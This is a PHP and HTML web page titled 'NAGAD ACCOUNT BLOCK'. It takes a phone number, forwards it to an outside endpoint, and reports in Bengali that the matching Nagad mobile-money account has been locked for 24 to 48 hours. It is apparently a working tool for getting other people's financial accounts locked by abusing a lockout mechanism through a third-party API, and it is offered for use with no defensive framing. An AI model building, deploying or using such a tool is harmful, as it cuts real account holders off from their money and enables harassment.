<?php
// If a phone number is submitted, fetch the API response
if (isset($_GET['phone'])) {
    $phone = htmlspecialchars($_GET['phone']);
    $apiUrl = "https://csk.freewebhostmost.com/nagad-block/nagodblock.php?number=" . $phone;
    $response = file_get_contents($apiUrl);
    echo $response;
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NAGAD Block</title>
    <style>
        /* Background and overall styling */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            background: url('https://www.boykotaskov.com/wp-content/uploads/2019/05/cyber_lion2-1.gif') no-repeat center center fixed;
            background-size: cover;
        }

        .container {
            background-color: rgba(0, 0, 0, 0.5); /* Fully transparent container */
            padding: 30px;
            border-radius: 15px;
            width: 350px;
            text-align: center;
            box-shadow: 0 8px 16px rgba(255, 255, 255, 0.2);
        }

        .container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ff4500; /* Highlighted title color */
        }

        .container input {
            width: calc(100% - 20px);
            padding: 12px;
            margin: 20px 0;
            border: none;
            border-radius: 8px;
            font-size: 16px;
        }

        .container button {
            width: 100%;
            padding: 12px;
            background-color: #ff4500;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }

        .container button:hover {
            background-color: #e03e00;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2;
        }

        .overlay .response-container {
            background-color: #1a1a1a;
            color: white;
            padding: 20px;
            border-radius: 10px;
            width: 350px;
            text-align: center;
            box-shadow: 0 8px 16px rgba(255, 255, 255, 0.2);
        }

        .overlay .response-container button {
            background-color: #ff4500;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }

        .overlay .response-container button:hover {
            background-color: #e03e00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>NAGAD ACCOUNT BLOCK</h1>
        <input type="text" id="phone" placeholder="Enter Number" />
        <button onclick="blockNumber()">Block</button>
        <p>&copy; Md.Sabbir Sheikh</p>
    </div>

    <div class="overlay" id="overlay">
        <div class="response-container">
            <div id="response"></div>
            <button onclick="closeOverlay()">Close</button>
        </div>
    </div>

    <script>
        function blockNumber() {
            const phone = document.getElementById("phone").value;
            const overlay = document.getElementById("overlay");
            const responseDiv = document.getElementById("response");

            if (phone.trim() === "") {
                alert("Please enter a number.");
                return;
            }

            fetch(`?phone=${encodeURIComponent(phone)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.STATUS && data.error) {
                        responseDiv.textContent = ` অ্যাকাউন্টটি 24/48 ঘন্টার জন্য লক করা হয়েছে`;
                        // responseDiv.textContent = `STATUS: ${data.STATUS}, Error: ${data.error}`;
                    } else {
                        responseDiv.textContent = "নগদ অ্যাকাউন্ট নম্বর দিন";
                        // responseDiv.textContent = "Invalid response from the server.";
                    }
                    overlay.style.display = "flex";
                })
                .catch(error => {
                    responseDiv.textContent = "An error occurred: " + error.message;
                    overlay.style.display = "flex";
                });
        }

        function closeOverlay() {
            const overlay = document.getElementById("overlay");
            overlay.style.display = "none";
        }
    </script>
</body>
</html>